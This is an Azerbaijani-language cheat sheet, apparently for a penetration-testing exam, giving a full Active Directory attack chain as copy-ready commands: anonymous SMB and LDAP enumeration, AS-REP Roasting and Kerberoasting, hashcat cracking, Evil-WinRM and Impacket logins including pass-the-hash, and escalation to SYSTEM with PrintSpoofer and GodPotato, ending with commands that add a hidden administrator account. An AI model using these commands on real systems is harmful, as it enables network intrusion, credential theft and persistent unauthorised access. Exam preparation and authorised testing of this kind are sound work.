
 1. **İlkin kəşfiyyat:** LDAP və ya SMB ilə anonim giriş tapılır və etibarlı məlumatlar (credentials) əldə edilir.
 2. **Hücum:** Mövcud məlumatlarla Kerberoasting və ya AS-REP Roasting edilir.
 3. **Giriş:** Qırılan şifrələrlə admin (və ya yüksək imtiyazlı istifadəçi) olaraq Evil-WinRM və ya Impacket alətləri vasitəsilə sistemə daxil olunur.
 4. **İmtiyazların artırılması (PrivEsc):** Əgər birbaşa local admin (SYSTEM) deyilsinizsə, SeImpersonatePrivilege hüququndan istifadə edərək **GodPotato** və ya **PrintSpoofer** ilə tam idarəetmə ələ keçirilir.
Bu zəncir üzrə imtahanda sürətli köçürüb istifadə edə biləcəyiniz **bütün praktiki əmrlər və kodlar**:
## 1. LDAP və ya SMB vasitəsilə Kəşfiyyat (Enumeration)
### SMB Anonim Giriş və Məlumat Çıxarma
```bash
# Anonim (Null Session) olaraq paylaşılan qovluqları yoxlayın
smbclient -L //<HƏDƏF_IP>/ -N

# Əgər açıq qovluq varsa, şifrəsiz daxil olun
smbclient //<HƏDƏF_IP>/<PAYLAŞILAN_QOVLUQ> -N

# Paylaşılan qovluqlardakı məlumatları sürətlə skan etmək üçün:
crackmapexec smb <HƏDƏF_IP> -u '' -p '' --shares

```
### LDAP Anonim Giriş (Null Session)
```bash
# LDAP üzərindən bütün AD obyektlərini, istifadəçiləri və şərhləri (Description) çəkin
ldapsearch -x -H ldap://<HƏDƏF_IP> -b "DC=domain,DC=local" > ldap_output.txt

# Çəkilən məlumatlar içərisində "password", "pass" və ya "description" sözlərini axtarın
grep -iE "password|pass|description" ldap_output.txt

```
## 2. Kerberos Hücumları (Məlumatları Tapdıqdan Sonra)
### AS-REP Roasting (Şifrə tələb etməyən hesablar)
```bash
# İstifadəçi adları siyahısı (users.txt) varsa və şifrəsiz hash almaq istəyirsinizsə:
impacket-GetNPUsers domain.local/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip <HƏDƏF_IP>

```
### Kerberoasting (Xidmət hesablarının şifrələrini çəkmək)
Əgər yuxarıdakı addımlardan standart bir istifadəçi adı və şifrə tapmısınızsa:
```bash
# Tapılan etibarlı məlumatlarla TGS biletlərini istəyin
impacket-GetUserSPNs domain.local/<tapılan_istifadəçi>:<tapılan_şifrə> -dc-ip <HƏDƏF_IP> -request -outputfile kerberoast.txt

```
### Hash Qırma
```bash
# AS-REP (Mode 18200)
hashcat -m 18200 -a 0 asrep.txt /usr/share/wordlists/rockyou.txt

# Kerberoast (Mode 13100)
hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt

```
## 3. Sistemə Giriş (Evil-WinRM və ya Impacket)
Qırılan və ya birbaşa tapılan admin / yüksək imtiyazlı istifadəçi məlumatları ilə içəri sızmaq:
### Evil-WinRM ilə Qoşulma (Port 5985/5986 aktivdirsə)
```bash
# Şifrə ilə birbaşa interaktiv PowerShell sessiyası açmaq:
evil-winrm -i <HƏDƏF_IP> -u 'administrator' -p 'qırılan_şifrə'

# Əgər əlinizdə şifrə yox, yalnız NTLM Hash varsa (Pass-the-Hash):
evil-winrm -i <HƏDƏF_IP> -u 'administrator' -H 'admin_ntlm_hash_bura'

```
### Impacket (SMB və ya WMI üzərindən qoşulma)
```bash
# SMBclient məntiqi ilə sistem əmrləri icra etmək (PsExec):
impacket-psexec domain.local/administrator:'şifrə'@<HƏDƏF_IP>

# WMI üzərindən iz buraxmadan qoşulmaq (Wmiexec):
impacket-wmiexec domain.local/administrator:'şifrə'@<HƏDƏF_IP>

```
## 4. İmtiyazların Artırılması (Local Admin -> SYSTEM)
Evil-WinRM və ya digər vasitə ilə daxil olduqdan sonra ilk olaraq hüquqlarınızı yoxlayın:
```cmd
whoami /priv

```
Əgər çıxan siyahıda **SeImpersonatePrivilege** statusu Enabled olaraq görünürsə, aşağıdakı alətlərlə birbaşa NT AUTHORITY\SYSTEM ola bilərsiniz.
### Alətlərin Maşına Yüklənməsi (Evil-WinRM daxilində)
Evil-WinRM sizə Kali-dəki faylları birbaşa yükləmək imkanı verir:
```powershell
# Kali-də olan qovluqdan faylı hədəf maşına ötürmək
upload /path/to/GodPotato-NET4.exe
upload /path/to/PrintSpoofer64.exe

```
### A. PrintSpoofer ilə SYSTEM olmaq
*Windows Server 2016, 2019 və Windows 10 sistemlərində işləyir.*
```cmd
# Yeni bir cmd.exe interfeysi açaraq SYSTEM imtiyazı qazanmaq:
.\PrintSpoofer64.exe -i -c cmd.exe

# Yoxlamaq üçün:
whoami
# Çıxış mütləq olmalıdır: nt authority\system

```
### B. GodPotato ilə SYSTEM olmaq
*Windows Server 2019, 2022 və Windows 11 kimi daha yeni sistemlərdə PrintSpoofer işləmədikdə GodPotato (.NET versiyasına uyğun olaraq) istifadə edilir.*
```cmd
# GodPotato vasitəsilə birbaşa SYSTEM olaraq əmr icra etmək:
.\GodPotato-NET4.exe -cmd "whoami"

# İmtahanda flag-ı sürətli oxumaq üçün xüsusi əmr göndərin:
.\GodPotato-NET4.exe -cmd "type C:\Users\Administrator\Desktop\flag.txt"

# Və ya özünüzə SYSTEM hüquqlu yeni bir admin istifadəçisi yaradın:
.\GodPotato-NET4.exe -cmd "net user haker Sifre123! /add"
.\GodPotato-NET4.exe -cmd "net localgroup administrators haker /add"

```
